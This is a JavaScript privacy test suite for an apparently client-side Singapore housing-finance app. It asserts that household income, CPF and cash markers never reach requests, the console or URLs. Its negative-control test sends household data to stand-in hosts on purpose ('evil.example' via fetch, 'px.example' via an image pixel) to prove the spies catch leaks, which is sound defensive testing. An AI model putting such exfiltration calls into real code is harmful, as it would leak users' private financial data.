// Privacy guarantee (go-live blocker 3; global rule "personal finances stay in the browser"): with a household full
// of marker values (income 987654, CPF 876543, cash 765432, names "ZZPRIVATE"), every code path that builds a URL,
// sends a request, writes to the console or touches location / history is driven for real — and the markers never
// show up in any of them. Saving them to localStorage and to a local file (export, Blob) is the intended place.
// The static half (every network / console call site in app/ is on an allow-list) is tests/privacy/egress.test.js;
// CSP + SRI are tests/privacy/headers.test.js. Browser-level proof (DevTools network list) stays a launch-day check.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import { M, MARKERS, ORIGIN, PATH, APP, installSpies, leaks, leaksIn, offOrigin, markerHousehold, memoryStorage } from './harness.js';
import { policy } from '../helpers.js';
import { createStore, defaults, STORE_KEY, LEGACY_KEY, SAMPLE_KEY, userSnapshot, requestSample, applySampleBoot, requestSampleExit } from '../../app/core/store.js';
import { downloadJson } from '../../app/core/dom.js';
import { snapshotOf, scenarioResults } from '../../app/engine/scenario.js';
import { planPurchase } from '../../app/engine/plan.js';
import { CPF_DEFAULTS } from '../../app/core/cpf-defaults.js';
import { shareUrl, readShareHash, b64url, SHARE_PREFIX } from '../../app/modules/explore/share.js';
import { buildPlaceIndex, searchPlaces } from '../../app/core/placesearch.js';
import { captureView, cleanView, addView } from '../../app/modules/explore/views.js';
import { answersFrom, householdFrom, routeFor, startRecord } from '../../app/modules/start/answers.js';
import { buildSample, samplePayload } from '../../app/modules/samples/build.js';
import { SAMPLES } from '../../app/modules/samples/data.js';
import { initI18n } from '../../app/core/i18n.js';
import { loadTownAliases } from '../../app/core/townalias.js';
import { loadPolicy } from '../../app/core/policy.js';
import { loadGuides } from '../../app/modules/guides/index.js';

const clean = (log, what) => assert.deepEqual(leaks(log), [], `${what}: markers leaked`);
const withSpies = async (fn, opts) => { const s = installSpies(opts); try { await fn(s); } finally { s.restore(); } return s.log; };

// data.js shape (tools/build_data.py) — four blocks are enough for share rows
const HDB = {
  streets: ['ANG MO KIO AVE 1', 'BISHAN ST 11'], towns: ['ANG MO KIO', 'BISHAN'], flat_types: ['3 ROOM', '4 ROOM', '5 ROOM'],
  storeys: ['01 TO 03', '04 TO 06', '07 TO 09'],
  blocks: [{ b: '10', s: 0, t: 0, lat: 1.37, lon: 103.84 }, { b: '20', s: 1, t: 1, lat: 1.35, lon: 103.85 }],
};
const CHOICES = [
  { id: 1, bid: 0, ft: 1, storey: 2, sqm: 93, price: 650000, facing: 'N', name: `${M.name} near school`, url: `https://listing.example/${M.name}` },
  { id: 2, bid: 1, ft: 2, storey: 1, sqm: 110, price: 820000, facing: '', name: `Mum's pick ${M.name}`, url: '' },
];

test('the markers are really in the household (so a clean result means something)', () => {
  const s = memoryStorage();
  const store = createStore({ storage: s });
  store.set('household', markerHousehold());
  assert.deepEqual(leaksIn(s.getItem(STORE_KEY)).sort(), ['765432', '876543', '854321', '912345', '987654', '23456'].sort());
  assert.ok(leaksIn(`x${SHARE_PREFIX}${b64url.enc(JSON.stringify({ n: M.name }))}`).includes(M.name), 'the leak check reads base64url payloads');
  assert.ok(MARKERS.includes('987,654'), 'formatted money is a marker too');
});

test('negative control: the spies catch a deliberate leak on every channel', async () => {
  const h = markerHousehold();
  const log = await withSpies(async () => {
    await fetch(`https://evil.example/?i=${h.buyers[0].income}`);
    await fetch('api', { method: 'POST', body: JSON.stringify(h) });
    const x = new XMLHttpRequest(); x.open('GET', `/x?c=${h.cash}`); x.send();
    navigator.sendBeacon('/b', M.name);
    new Image().src = `https://px.example/${h.buyers[0].cpfOa}`;
    console.log('household', h);
    history.replaceState(null, '', `#${b64url.enc(M.name)}`);
    location.href = `?cash=${h.cash.toLocaleString('en-SG')}`;
  });
  const found = leaks(log).join('\n');
  for (const s of ['evil.example', 'api', '/x?c=', 'beacon', 'px.example', 'console.log', 'history.replaceState', 'location.href']) assert.ok(found.includes(s), `caught: ${s}`);
  assert.equal(offOrigin(log).length, 2);
});

test('household, scenarios, compute, export / import / forget: localStorage + a local file only — no request, console, URL', async () => {
  let saved = null, file = null;
  const log = await withSpies(async ({ created }) => {
    const s = memoryStorage();
    const store = createStore({ storage: s });
    store.set('household', markerHousehold());
    store.set('focus', { source: 'choice', choiceId: 1, bid: 0, label: `${M.name} flat`, price: 650000, flatType: '4 ROOM', remainingLease: 70 });
    store.set('plan.cpf', { wageGrowth: 0.03, bonusMonths: 1, prYear: {} });
    const flat = store.get('focus');
    planPurchase({ household: store.get('household'), flat: { price: flat.price, flatType: flat.flatType, remainingLease: 70, cov: 0 } }, policy);
    const id = store.saveScenario((sid) => snapshotOf({ id: sid, name: `${M.name} plan`, savedAt: '2026-10-07T00:00:00Z', flat, household: store.get('household'), plan: store.get('plan'), marketRent: 3000 }));
    assert.equal(id, 'A');
    scenarioResults(store.get('scenarios')[0], policy, { year: 2026, horizonYears: 10, cpfDefaults: CPF_DEFAULTS });
    store.renameScenario('A', `${M.name} renamed`);
    const exported = store.export();
    downloadJson(exported, 'sg-housing-household.json');
    file = created[0];
    store.import(exported);
    saved = s.getItem(STORE_KEY);
    store.reset();
    assert.equal(s.getItem(STORE_KEY), null, 'forget removes the household');
    assert.equal(s.getItem(LEGACY_KEY), null, 'forget removes the map save');
  });
  assert.ok(leaksIn(saved).length >= 5, 'the household is in localStorage (the intended place)');
  assert.equal(file.tag, 'a');
  assert.match(file.href, /^blob:/, 'export = a Blob URL on this device, not a network URL');
  assert.equal(file.download, 'sg-housing-household.json');
  assert.equal(file.clicked, true);
  assert.deepEqual(log.requests, [], 'no request at all');
  assert.deepEqual(log.nav, [], 'no location / history change');
  clean(log, 'store + engines');
});

test('share link: flats only, in the #fragment (never sent to a server); no names, listing URLs or household', async () => {
  let url;
  const log = await withSpies(async () => {
    const store = createStore({ storage: memoryStorage() });
    store.set('household', markerHousehold());
    url = shareUrl(CHOICES, HDB, globalThis.location);
  });
  const [before, frag] = url.split('#');
  assert.equal(before, `${ORIGIN}${PATH}`, 'origin + path only: no query string');
  assert.ok(frag.startsWith('shortlist='));
  const rows = JSON.parse(b64url.dec(frag.slice('shortlist='.length)));
  assert.deepEqual(rows, [['10|ANG MO KIO AVE 1', '4 ROOM', '07 TO 09', 93, 650000, 'N'], ['20|BISHAN ST 11', '5 ROOM', '04 TO 06', 110, 820000, '']],
    'exactly [block|street, flat type, storey, sqm, asking price, facing] — asking prices are included by design');
  assert.deepEqual(leaksIn(url), [], 'no nickname, listing URL, income, CPF or cash');
  assert.deepEqual([...log.requests, ...log.nav], []);
  clean(log, 'share');
  // round trip + bad input
  const back = readShareHash(`#${frag}`, HDB);
  assert.deepEqual(back.rows.map((r) => [r.bid, r.ft, r.storey, r.sqm, r.price]), [[0, 1, 2, 93, 650000], [1, 2, 1, 110, 820000]]);
  assert.equal(readShareHash('#other', HDB), null);
  assert.deepEqual(readShareHash('#shortlist=@@', HDB), null, 'not the share alphabet → not a share link');
  assert.deepEqual(readShareHash('#shortlist=bm90IGpzb24', HDB), { error: true });
});

test('Daily places search runs on the loaded data: no request at all, even for typed marker text', async () => {
  let found, none;
  const log = await withSpies(async () => {
    const store = createStore({ storage: memoryStorage() });
    store.set('household', markerHousehold());
    const index = buildPlaceIndex({ hdb: HDB, poi: { schools: [], malls: [{ n: 'Junction 8', lat: 1.35, lon: 103.848 }] } });
    found = searchPlaces(index, 'bishan st 11');
    none = searchPlaces(index, `${M.name} office`);
  });
  assert.equal(found[0].label, 'Bishan St 11');
  assert.deepEqual(none, []);
  assert.deepEqual([...log.requests, ...log.nav], [], 'no request, beacon or navigation');
  clean(log, 'Daily places search');
});

test('saved map views keep map settings only — never the household, shortlist names or daily places', () => {
  const S = {
    colorBy: 'psf', chipLabel: 'value', ft: [1, 2], calcM: 24, hist: { from: 2016, to: 2026 }, towns: [0],
    filt: { pmin: 400000, pmax: null }, layers: { blocks: true, mrt: false }, area: { type: 'circle', lat: 1.35, lon: 103.85, r: 1500 },
    commuteHubs: ['raffles'], profile: { income: M.income, cash: M.cash, cpf: M.cpf }, choices: CHOICES,
    workplaces: [{ name: `${M.name} office`, lat: 1.28, lon: 103.85 }], views: [],
  };
  const v = captureView(S, { flatTypes: HDB.flat_types, towns: HDB.towns, center: { lat: 1.35, lng: 103.82 }, zoom: 14 });
  assert.deepEqual(leaksIn(v), []);
  const list = addView([], v, 'Weekend look', '2026-10-07');
  assert.deepEqual(leaksIn(list), []);
  // a tampered / imported view with extra fields: dropped on clean
  const dirty = cleanView({ ...v, income: M.income, cash: M.cash, note: M.name, profile: { cpf: M.cpf }, choices: CHOICES });
  assert.deepEqual(leaksIn(dirty), []);
});

test('Start here: answers go to the household (localStorage); the map hand-off and the stored record carry no answers', async () => {
  const log = await withSpies(async () => {
    const a = { ...answersFrom(defaults().household), goal: 'buyResale', buyers: 2, ages: [34, 33], income: M.income, firstTimer: true, towns: ['BISHAN'] };
    const h = householdFrom(a, defaults().household);
    assert.equal(h.buyers[0].income + h.buyers[1].income, M.income, 'answers really reach the household');
    const r = routeFor(a, []);
    assert.deepEqual(leaksIn(r), [], 'explore:view / nav payload');
    assert.deepEqual(leaksIn(startRecord('done', '2026-10-07', a.goal)), []);
  });
  assert.deepEqual([...log.requests, ...log.nav, ...log.console], []);
});

test('sample households: the sample payload holds none of the user\'s data; the backup stays in localStorage', async () => {
  const s = memoryStorage();
  const store = createStore({ storage: s });
  store.set('household', markerHousehold());
  s.setItem(LEGACY_KEY, JSON.stringify({ choices: CHOICES, nextId: 3, profile: { income: M.income }, workplaces: [{ name: M.name }], colorBy: 'psf' }));
  const log = await withSpies(async () => {
    for (const sample of SAMPLES) {
      const built = buildSample(sample, { base: userSnapshot(s), resolve: () => null, flatTypes: HDB.flat_types, asOf: new Date(2026, 9, 7), leaseTerm: 99 });
      const payload = samplePayload(built);
      assert.deepEqual(leaksIn(payload), [], `${sample.id}: payload`);
    }
    requestSample(s, SAMPLES[0].id, samplePayload(buildSample(SAMPLES[0], { base: userSnapshot(s), flatTypes: HDB.flat_types, asOf: new Date(2026, 9, 7), leaseTerm: 99 })));
    applySampleBoot(s);
    assert.deepEqual(leaksIn(s.getItem(STORE_KEY)), [], 'live keys now hold the sample');
    assert.ok(leaksIn(s.getItem(SAMPLE_KEY)).length > 0, 'the user\'s data waits in the local backup');
    requestSampleExit(s); applySampleBoot(s);
    assert.ok(leaksIn(s.getItem(STORE_KEY)).length > 0, 'and comes back on exit');
  });
  assert.deepEqual([...log.requests, ...log.nav], []);
  clean(log, 'samples');
});

test('same-origin loaders (language, policy, guides, offline size) fetch fixed relative files only', async () => {
  const log = await withSpies(async () => {
    const store = createStore({ storage: memoryStorage() });
    store.set('household', markerHousehold());
    await initI18n('zh');
    await loadPolicy('policy/sg-policy.json');
    await loadGuides('zh');
    await loadGuides('en');
    await fetch('sw-manifest.json'); // modules/offline/index.js (size line)
    await loadTownAliases(); // 7b B15: 中文 town names for the map search
    await initI18n('en');
  });
  const urls = log.requests.map((r) => r.url);
  assert.ok(urls.length >= 7);
  for (const u of urls) assert.match(u, /^(i18n\/zh(-guide|-explore|-engine)?\.json|i18n\/towns\.zh\.json|policy\/sg-policy\.json|content\/guides(\.zh)?\.json|sw-manifest\.json)$/, u);
  assert.deepEqual(offOrigin(log), []);
  clean(log, 'loaders');
});

// ---------------------------------------------------------------- the service worker (sw.js) in node:vm
function runWorker(log) {
  const src = (f) => readFileSync(new URL(f, APP), 'utf8');
  const manifest = JSON.parse(src('sw-manifest.json'));
  const scope = `${ORIGIN}${PATH}`;
  const stores = new Map();
  const cacheOf = (name) => {
    if (!stores.has(name)) stores.set(name, new Map());
    const m = stores.get(name);
    return { match: async (k) => m.get(typeof k === 'string' ? k : k.url), put: async (k, res) => { m.set(typeof k === 'string' ? k : k.url, res); }, keys: async () => [...m.keys()] };
  };
  const caches = {
    open: async (n) => cacheOf(n), keys: async () => [...stores.keys()], delete: async (n) => stores.delete(n),
    match: async (k, o = {}) => { for (const [n, m] of stores) { if (o.cacheName && o.cacheName !== n) continue; const hit = m.get(typeof k === 'string' ? k : k.url); if (hit) return hit; } return undefined; },
  };
  const handlers = {};
  const fetch = async (input, init = {}) => {
    const url = typeof input === 'string' ? input : input.url;
    log.requests.push({ kind: 'sw-fetch', url, body: '', headers: '' });
    if (url.endsWith('sw-manifest.json')) return new Response(JSON.stringify(manifest), { status: 200 });
    return new Response('ok', { status: 200 });
  };
  const self = {
    registration: { scope }, location: { origin: ORIGIN }, navigator: { onLine: true },
    addEventListener: (type, fn) => { handlers[type] = fn; }, clients: { claim: async () => {} }, skipWaiting: () => {},
  };
  const ctx = vm.createContext({ self, caches, fetch, URL, Response, Request, Promise, console: { warn: (...a) => log.console.push({ level: 'warn', text: a.join(' ') }) } });
  ctx.importScripts = (f) => vm.runInContext(src(f), ctx);
  vm.runInContext(src('sw.js'), ctx);
  const dispatch = async (type, extra = {}) => {
    const waits = []; let responded = null;
    handlers[type]({ ...extra, waitUntil: (p) => waits.push(p), respondWith: (p) => { responded = p; } });
    await Promise.all(waits);
    return responded ? await responded : null;
  };
  return { dispatch, stores, scope };
}

test('service worker: caches only static same-origin / cdnjs GET files; OneMap tiles, other hosts and POST bypass it', async () => {
  const log = { requests: [], console: [], nav: [] };
  const w = runWorker(log);
  await w.dispatch('install');
  const req = (url, method = 'GET', mode = 'cors') => ({ request: { url, method, mode, headers: { has: () => false } } });
  assert.equal(await w.dispatch('fetch', req(`https://www.onemap.gov.sg/api/common/elastic/search?searchVal=${M.name}`)), null, 'any OneMap URL not handled');
  assert.equal(await w.dispatch('fetch', req('https://www.onemap.gov.sg/maps/tiles/Grey/15/1/1.png')), null, 'tiles not handled');
  assert.equal(await w.dispatch('fetch', req('https://tracker.example/p.gif')), null, 'other hosts not handled');
  assert.equal(await w.dispatch('fetch', req(`${w.scope}index.html`, 'POST')), null, 'non-GET not handled');
  assert.ok(await w.dispatch('fetch', req(`${w.scope}?features=-btoData${SHARE_PREFIX}abc`, 'GET', 'navigate')), 'navigation served');
  const keys = [...w.stores.values()].flatMap((m) => [...m.keys()]);
  assert.ok(keys.length > 20, 'install saved the app');
  for (const k of keys) {
    assert.ok(k.startsWith(w.scope) || k.startsWith('https://cdnjs.cloudflare.com/'), `cached ${k}`);
    assert.ok(!/[?#]/.test(k), `cache key without query / fragment: ${k}`);
  }
  assert.ok(!log.requests.some((r) => r.url.includes('onemap')), 'the worker never fetches OneMap itself');
  for (const r of log.requests) assert.ok(r.url.startsWith(w.scope) || r.url.startsWith('https://cdnjs.cloudflare.com/'), r.url);
  clean(log, 'service worker');
});
